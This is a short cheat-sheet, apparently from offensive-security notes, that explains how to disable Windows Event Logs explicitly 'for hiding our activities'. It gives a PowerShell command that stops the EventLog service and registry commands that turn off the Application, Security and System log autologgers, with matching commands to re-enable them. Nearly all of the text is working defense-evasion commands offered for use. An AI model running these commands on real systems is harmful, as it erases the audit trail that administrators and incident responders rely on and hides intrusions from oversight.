# Disable Event Logs

We may disable Windows Event Logs for hiding our activities. There are several ways to do that.

## Stop-Service

```powershell
Stop-Service -Name EventLog -Force
```

To restart it, use the `Start-Service` cmdlet:

```powershell
Start-Service -Name EventLog
```

## Registry

The following commands disable each Event Log (Application, Security, System). We need to reboot the machine to apply these settings.

```powershell
reg add HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application /v Start /t REG_DWORD /d 0 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Security /v Start /t REG_DWORD /d 0 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System /v Start /t REG_DWORD /d 0 /f
```

To restart them, set `1` to the values:

```powershell
reg add HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application /v Start /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Security /v Start /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System /v Start /t REG_DWORD /d 1 /f
```
